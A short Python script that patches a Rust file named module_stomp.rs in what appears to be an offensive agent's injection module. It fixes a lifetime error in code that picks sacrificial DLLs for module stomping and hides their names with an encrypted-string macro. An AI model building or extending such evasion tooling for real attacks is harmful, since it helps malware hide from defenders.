import re

with open("agent/src/injection/module_stomp.rs", "r") as f:
    text = f.read()

# Fix the lifetime error 
text = text.replace('''            let mut c1_vec = Vec::new(); c1_vec.extend_from_slice(enc_str!("msfte.dll").as_ref());
            let mut c2_vec = Vec::new(); c2_vec.extend_from_slice(enc_str!("msratelc.dll").as_ref());
            let mut c3_vec = Vec::new(); c3_vec.extend_from_slice(enc_str!("scrobj.dll").as_ref());
            let mut c4_vec = Vec::new(); c4_vec.extend_from_slice(enc_str!("amstream.dll").as_ref());

            let candidates: Vec<&[u8]> = vec![
                &c1_vec[..],
                &c2_vec[..],
                &c3_vec[..],
                &c4_vec[..]
            ];
''', '''
            let c1 = enc_str!("msfte.dll");
            let c2 = enc_str!("msratelc.dll");
            let c3 = enc_str!("scrobj.dll");
            let c4 = enc_str!("amstream.dll");
            
            let candidates: Vec<&[u8]> = vec![
                c1.as_ref(),
                c2.as_ref(),
                c3.as_ref(),
                c4.as_ref()
            ];
''')

with open("agent/src/injection/module_stomp.rs", "w") as f:
    f.write(text)

